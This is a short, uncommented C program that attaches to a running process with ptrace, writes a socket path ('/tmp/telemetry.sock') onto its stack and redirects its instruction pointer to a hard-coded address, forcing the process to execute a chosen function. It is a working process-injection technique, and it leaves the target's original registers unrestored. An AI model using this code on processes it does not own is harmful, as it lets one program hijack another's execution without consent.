#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/syscall.h>

int main(int argc, char *argv[]) {
    pid_t pid = atoi(argv[1]);
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
        perror("ptrace attach");
        return 1;
    }
    waitpid(pid, NULL, 0);

    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0) {
        perror("ptrace getregs");
        return 1;
    }

    const char *sock_path = "/tmp/telemetry.sock";
    regs.rsp = (regs.rsp - 64) & ~0xF;

    long words[4] = {0};
    strcpy((char*)words, sock_path);
    for (int i = 0; i < 4; i++) {
        ptrace(PTRACE_POKEDATA, pid, regs.rsp + i * 8, words[i]);
    }

    regs.rdi = regs.rsp;
    regs.rip = 0x5555555d2540;

    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) < 0) {
        perror("ptrace setregs");
        return 1;
    }

    if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0) {
        perror("ptrace cont");
        return 1;
    }

    printf("Injected RIP and string!\n");
    return 0;
}
